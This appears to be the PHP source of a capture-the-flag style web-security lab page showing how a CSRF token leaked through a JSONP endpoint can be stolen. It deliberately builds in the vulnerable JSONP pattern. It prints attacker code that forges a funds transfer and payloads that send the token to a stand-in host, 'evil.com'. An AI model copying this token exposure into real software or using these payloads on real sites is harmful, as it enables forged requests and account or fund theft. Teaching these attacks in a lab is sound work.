<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['JSONP']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

if (!isset($_SESSION['jsonp_case3_attempts'])) {
  $_SESSION['jsonp_case3_attempts'] = 0;
}
if (!isset($_SESSION['jsonp_case3_solved'])) {
  $_SESSION['jsonp_case3_solved'] = false;
}

// Generate a CSRF token
if (!isset($_SESSION['csrf_token'])) {
  $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['csrf_token'];

// VULNERABLE: JSONP endpoint exposing CSRF token
$callback = $_GET['callback'] ?? 'callback';

$token_data = [
  'csrf_token' => $csrf_token,
  'form_id' => 'transfer_funds',
  'expires' => time() + 3600,
  'user_id' => $_SESSION['user_id'] ?? 'guest'
];

$flag_triggered = false;
if (isset($_GET['callback'])) {
  $cb = $_GET['callback'];
  if (
    stripos($cb, 'alert') !== false ||
    stripos($cb, 'eval') !== false ||
    stripos($cb, 'fetch') !== false ||
    stripos($cb, 'XMLHttpRequest') !== false ||
    stripos($cb, 'document.cookie') !== false
  ) {
    $flag_triggered = true;
  }
}

$success_msg = null;
$already_solved = $_SESSION['jsonp_case3_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['jsonp_case3_attempts']++;
  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }
  $_SESSION['jsonp_case3_solved'] = true;
  $already_solved = true;
  $success_msg = "Outstanding! You've successfully stolen a CSRF token via JSONP. By including the token endpoint as a script tag, you bypassed same-origin policy and obtained the anti-CSRF token needed for state-changing attacks!";
}

if (isset($_GET['callback'])) {
  $_SESSION['jsonp_case3_attempts']++;
}

$attempts = $_SESSION['jsonp_case3_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Token Service - JSONP Case 3 (CSRF Token Steal)</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/JSONP-CASE3.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to JSONP Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge medium"><i class="fas fa-bolt"></i> Medium Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-key"></i> CSRF Token Service</h1>
      <p class="lab-description">Fetch anti-CSRF tokens. This medium challenge exposes <strong>CSRF tokens through
          JSONP</strong>, allowing attackers to perform state-changing actions!</p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this CSRF Token Steal vulnerability.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <div class="api-status-bar">
      <div class="api-indicator"><i class="fas fa-shield-alt"></i><span>CSRF Token: <strong>Exposed</strong></span>
      </div>
      <div class="origin-indicator"><i class="fas fa-unlock"></i><span>Protection: <strong>None</strong></span></div>
      <?php if ($flag_triggered): ?>
      <div class="exploit-indicator"><i class="fas fa-skull-crossbones"></i><span>EXPLOIT DETECTED!</span></div>
      <?php endif; ?>
    </div>

    <div class="jsonp-grid">
      <div class="jsonp-card token-card">
        <div class="card-header">
          <i class="fas fa-fingerprint"></i>
          <h3>Current CSRF Token</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> JSONP Exposed</span>
        </div>
        <div class="token-content">
          <div class="token-display">
            <span class="token-label">Token Value:</span>
            <code class="token-value"><?php echo $csrf_token; ?></code>
          </div>
          <div class="token-meta">
            <div class="meta-item"><i class="fas fa-clock"></i><span>Expires: 1 hour</span></div>
            <div class="meta-item"><i class="fas fa-user"></i><span>User:
                <?php echo $_SESSION['user_id'] ?? 'guest'; ?></span></div>
            <div class="meta-item"><i class="fas fa-file-alt"></i><span>Form: transfer_funds</span></div>
          </div>
          <div class="token-warning">
            <i class="fas fa-exclamation-triangle"></i>
            <span>This token is returned via JSONP without origin validation. Any site can steal it!</span>
          </div>
        </div>
      </div>

      <div class="jsonp-card attack-card">
        <div class="card-header">
          <i class="fas fa-crosshairs"></i>
          <h3>Attack Scenario</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> State Change</span>
        </div>
        <div class="attack-content">
          <div class="attack-step">
            <span class="step-num">1</span>
            <span class="step-text">Attacker includes JSONP endpoint on evil.com</span>
          </div>
          <div class="attack-step">
            <span class="step-num">2</span>
            <span class="step-text">Callback receives CSRF token:
              <code><?php echo substr($csrf_token, 0, 16); ?>...</code></span>
          </div>
          <div class="attack-step">
            <span class="step-num">3</span>
            <span class="step-text">Attacker submits forged request with stolen token</span>
          </div>
          <div class="attack-step">
            <span class="step-num">4</span>
            <span class="step-text">Server accepts request - CSRF protection bypassed!</span>
          </div>
          <div class="exploit-code">
            <div class="code-label">Attacker Code:</div>
            <pre
              class="code-block"><code>&lt;script&gt;
function stealToken(data) {
  var token = data.csrf_token;
  fetch('/bank/transfer', {
    method: 'POST',
    body: 'amount=10000&to=attacker&csrf=' + token
  });
}
&lt;/script&gt;
&lt;script src="<?php echo htmlspecialchars("http://" . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?')); ?>?callback=stealToken"&gt;&lt;/script&gt;</code></pre>
          </div>
        </div>
      </div>

      <div class="jsonp-card analysis-card">
        <div class="card-header"><i class="fas fa-microscope"></i>
          <h3>Vulnerability Analysis</h3>
        </div>
        <div class="analysis-content">
          <div class="analysis-item">
            <span class="analysis-label">Token Exposure:</span>
            <code class="analysis-code">// Returned in JSONP response</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Cross-Origin</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Origin Check:</span>
            <code class="analysis-code">// Referer not validated</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Missing</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Secure Fix:</span>
            <code class="analysis-code">SameSite=Strict + X-Requested-With</code>
            <span class="analysis-status safe"><i class="fas fa-check-circle"></i> Required</span>
          </div>
        </div>
      </div>

      <div class="jsonp-card payloads-card">
        <div class="card-header"><i class="fas fa-bolt"></i>
          <h3>Token Steal Payloads</h3>
        </div>
        <div class="payloads-list">
          <div class="payload-item">
            <div class="payload-name">Token Logger</div>
            <code class="payload-code">?callback=console.log</code>
            <span class="payload-target">View token in console</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Token Exfil</div>
            <code class="payload-code">?callback=fetch("//evil.com?token="+data.csrf_token)</code>
            <span class="payload-target">Send token to attacker</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Auto-Submit</div>
            <code
              class="payload-code">?callback=function(d){document.forms[0].csrf.value=d.csrf_token;document.forms[0].submit()}</code>
            <span class="payload-target">Auto-submit forged form</span>
          </div>
        </div>
      </div>
    </div>

    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-code"></i><span>Current Request</span></div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>Token: <?php echo substr($csrf_token, 0, 16); ?>...</span>
          <span>Flag: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
          <span>Attempts: <?php echo $attempts; ?></span>
        </div>
      </div>
    </div>

    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">The CSRF token is returned via JSONP. Try <code>?callback=alert</code> to see the token
        data structure. Any website can include this endpoint and steal the token!</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">Try <code>?callback=eval("fetch('//evil.com?token='+data.csrf_token)")</code>. The token
        can be used to forge requests that the server will accept as legitimate!</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Use <code>?callback=alert</code> or any callback containing <code>fetch</code>,
        <code>eval</code>, or <code>XMLHttpRequest</code> to trigger the flag. The vulnerability allows complete CSRF
        protection bypass!</div>
    </div>
    <?php endif; ?>

    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
  window.addEventListener('load', function() {
    const exploitIndicator = document.querySelector('.exploit-indicator');
    const alreadySolved = document.querySelector('.solved-banner');
    if (exploitIndicator && !alreadySolved) {
      document.getElementById('solved-flag').value = '1';
      document.getElementById('success-form').submit();
    }
  });
  </script>
</body>

</html>